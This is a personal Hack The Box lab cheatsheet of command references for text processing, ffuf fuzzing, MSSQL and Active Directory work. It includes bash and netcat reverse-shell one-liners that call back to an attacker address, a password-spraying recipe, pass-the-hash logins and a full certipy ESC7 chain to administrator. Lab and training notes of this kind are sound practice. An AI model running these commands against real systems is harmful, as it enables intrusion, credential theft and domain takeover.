+++
title = "Cheatsheet"
date = 2026-11-26T12:00:00+00:00
draft = false
tags = ["cheatsheet", "reference"]
categories = ["HTB"]
summary = "Quick-reference commands for HTB — text processing, ffuf, reverse shells, MSSQL, Active Directory, Kerberos/ADCS, vi and tmux."
+++

A living quick-reference of the commands I reach for on HTB boxes — text processing, fuzzing, shells,
Active Directory and ADCS, plus vi/tmux. Replace `$IP`, `$DOMAIN` and credential placeholders as needed.

---

## Text processing / field extraction (terminal-fu)

**The recurring task: "pull just column X out of this messy output into a clean list."**
Mental model — pick the tool by how the data is split:
- fields split by a **single char** (`:`, `,`, `\`, `/`) → `cut -d'<char>' -f<N>`
- fields split by **whitespace** (any run of spaces/tabs) → `awk '{print $N}'`
- need to **match a pattern inside a line** and grab part of it → `sed -E 's/.../.../' ` or `grep -oP`
- keep only lines that match / don't match → `grep` / `grep -v`

### cut — single-delimiter columns
```bash
cut -d':' -f1 /etc/passwd            # usernames (passwd is colon-separated)
cut -d':' -f1,3,7 /etc/passwd        # fields 1,3,7
cut -d',' -f2 data.csv               # 2nd CSV column
cut -d'\' -f2   # split on a backslash (one backslash; in '' no escaping needed)
```
- `cut` splits on a **literal single char** and treats each one as a boundary (two `::` = an empty field). It does NOT collapse repeated spaces — for whitespace use awk.

### awk — whitespace columns + logic
```bash
awk '{print $2}'                     # 2nd whitespace field ($0 = whole line, NF = field count)
awk '{print $1, $3}'                 # comma in print = space between them
awk -F':' '{print $1}' /etc/passwd   # set a different delimiter with -F
awk -F'\t' '{print $2}'              # tab-separated
awk '/SidTypeUser/ {print $2}'       # only lines matching a pattern, then extract
awk -F: '$3 >= 1000 {print $1}' /etc/passwd   # condition on a field (real users)
awk '{print $NF}'                    # last field, whatever the count
```
- **Always single-quote the program** (`awk '{print $2}'`) — double quotes let the shell eat `$2`.
- awk collapses runs of whitespace automatically, so `$2` is robust to extra spaces.

### sed — substitute / extract with regex
```bash
sed 's/old/new/g'                    # replace all
sed -E 's/.*\(([^)]+)\).*/\1/'       # capture text inside parentheses (\1 = group 1)
sed -n '5,10p'                       # print only lines 5-10
sed 's/^[0-9]*: //'                  # strip a leading "1104: " prefix
sed 's/DOMAIN\\//'                   # drop a DOMAIN\ prefix (\\ = one backslash in sed)
```

### grep — filter, and extract with -oP
```bash
grep PATTERN file                    # pattern FIRST, file SECOND (no cat needed!)
#   grep hanging? you gave a pattern but no file → it's waiting on stdin. Ctrl-C, check arg order.
grep SidTypeUser                     # keep matching lines
grep -v '\$'                         # drop lines containing $ (e.g. machine accounts)
grep -i foo                          # case-insensitive
grep '/bin/bash$'                    # ends with ...   ($ = end anchor, ^ = start anchor)
grep '\.sh$'                         # files ending in .sh — ESCAPE the dot (. = any char), $ = end
grep -oP '(?<=\()\w+(?=\))'          # print ONLY text inside ( ) — Perl lookarounds (?<=)(?=)
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'   # extract IPs (group+{3} repeat)
grep -oE '[A-Za-z0-9._-]+@[A-Za-z0-9.-]+' # extract emails
#   a char class matches ONE char — add +/*/{n} for a run: [a-z] -> [a-z]+
#   always single-quote the regex so the shell doesn't eat $ \ * 
# find files by extension on a box:
find / -name '*.sh' 2>/dev/null      # or: ls -la | grep '\.sh$'
```

### sort / uniq / wc / tr
```bash
sort -u                              # sort + dedupe
sort | uniq -c | sort -rn            # count occurrences, most common first
wc -l                                # count lines
tr 'A-Z' 'a-z' < users.txt > users_lower.txt   # lowercase (case matters for pw sprays!)
tr -d '\r'                           # strip carriage returns from Windows output
tr -s ' '                            # squeeze repeated spaces into one
```

### Worked recipes (the ones that keep coming up)
```bash
# lookupsid output: "1104: DOMAIN\Name (SidTypeUser)"  ->  clean username list
lookupsid.py anonymous@$DOMAIN | grep SidTypeUser | awk '{print $2}' | cut -d'\' -f2 > users.txt
#   grep -> only user objects | awk $2 -> DOMAIN\Name (field 2) | cut -> strip DOMAIN\

# nmap greppable: pull just the open-port numbers
grep -oP '\d+/open' scan.gnmap | cut -d/ -f1 | sort -un | paste -sd,   # -> 22,80,445,...

# extract emails / usernames from a page or file
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' page.html | sort -u

# CSV: 3rd column, skip the header row
tail -n +2 data.csv | cut -d',' -f3

# build a numeric wordlist (port fuzzing etc.)
seq 0 65535 > ports.txt        # or inline: -w <(seq 0 65535)
```

> 📚 Want to *drill* this until it's muscle memory? Say **"let's work on terminal fu"** and I'll run a lesson from `~/htb/terminal-fu/` (see its README).

---

## ffuf — fuzzing a value inside a captured request

Save the request from Burp to a file, put `FUZZ` where the value goes, then:
```bash
ffuf -request req.txt -request-proto http -w <(seq 0 65535) -fs <baseline_size>
```
- **Don't** also pass `-u` with `-request` — the URL/Host come from the file; `-u` conflicts.
- `-request-proto http` — default is **https**; set it for plain http.
- `FUZZ` must literally appear in the request file or nothing gets fuzzed.
- Always filter: baseline one "miss" response first, then `-fs <size>` (or `-fw`/`-fc`).
  If `-fw 1` nukes everything, the filter's wrong — measure the real miss size and use `-fs`.

---

## Reverse shells (quoting that actually works)

From a Python REPL / Werkzeug console (single line, no multi-line blocks):
```python
import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.x/1337 0>&1"')
```
- Key: **single quotes** around the Python string, **double quotes** for the bash `-c` arg. Don't nest same-type quotes.

Quote-free fallback (mkfifo):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.x 1337 >/tmp/f
```

Listener:
```bash
nc -lvnp 1337
```
Use the **tun0** IP (not the box IP, not 127.0.0.1): `ip a show tun0`.

---

## MSSQL (impacket mssqlclient)

Connect with Windows auth:
```bash
mssqlclient.py $DOMAIN/user:pass@$IP -windows-auth
```
Non-TTY shells break the interactive `SQL>` prompt — if output is blank, run queries one-shot elsewhere, or:
- `enable_xp_cmdshell` then `xp_cmdshell whoami` (needs privilege; often denied)
- **No cmdshell? Read the filesystem instead:** `xp_dirtree C:\inetpub\wwwroot` (lists dirs, no special priv). Files in the IIS web root are then downloadable over HTTP.

If a reverse shell is non-interactive and `mysql>`/`SQL>` gives nothing, run the client non-interactively:
```bash
mysql -u user -p'pass' -e "show databases;"          # MySQL/MariaDB
mysql -u user -p'pass' -e "use db; select * from t;"
```

---

## Active Directory — early moves

```bash
# SMB: null / guest, shares, RID brute
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u '' -p '' --rid-brute        # user list even when shares are locked
lookupsid.py anonymous@$DOMAIN             # alt RID cycling

# Password spray: username == password (one try per account = lockout-safe)
nxc smb $IP -u users.txt -p users_lower.txt --no-bruteforce --continue-on-success
#   remember: AD usernames are case-INsensitive, passwords are case-SENSITIVE → spray both cases

# Check what a cred can do
nxc winrm $IP -u user -p pass      # (Pwn3d!) = evil-winrm works
nxc ldap  $IP -u user -p pass --users
ldapdomaindump -u 'DOMAIN\user' -p pass $IP   # read domain_users_by_group.html for group membership

# Shell
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H <NTLM_hash>      # pass-the-hash (no password needed)
```

---

## Kerberos clock skew

Symptom: `KRB_AP_ERR_SKEW` / clock errors from certipy/impacket.
```bash
sudo ntpdate $DOMAIN        # sets system clock to DC
```
If the clock keeps reverting (VM host forces guest time), don't fight it — wrap the command:
```bash
faketime -f '+7h' certipy ... -dc-ip $IP     # offset only this command's view of time
```
Tune the offset (`+7h`, `-7h`, `+6h55m`) on a `certipy find` until the skew error clears, then reuse it on every step.

---

## ADCS (certipy) — ESC7 (ManageCA) chain

```bash
certipy find -u user@$DOMAIN -p pass -dc-ip $IP -vulnerable -stdout   # "no templates" line = noise; look for ESCx
# ESC7 = ManageCA right:
certipy ca  -ca <CA> -add-officer user -u user@$DOMAIN -p pass -dc-ip $IP      # 1. self-grant Officer (resets periodically!)
certipy req -ca <CA> -template SubCA -upn administrator@$DOMAIN -u user@$DOMAIN -p pass -dc-ip $IP   # 2. denied, note request ID
certipy ca  -ca <CA> -issue-request <id> -u user@$DOMAIN -p pass -dc-ip $IP    # 3. approve as Officer
certipy req -ca <CA> -retrieve <id> -u user@$DOMAIN -p pass -dc-ip $IP         # 4. -> administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip $IP                                  # 5. PKINIT -> NT hash
# then pass-the-hash: evil-winrm -i $IP -u Administrator -H <hash>
```

---

## Debugging a failed step (method, not a command)

When a step fails, **isolate one variable and prove the mechanism with known-good input first.**
e.g. file-read/SSRF giving 404? Point it at something you *know* exists (serve your own file, read it back) to confirm the primitive works, *then* attack the real target. Saves hours of guessing which part is broken.
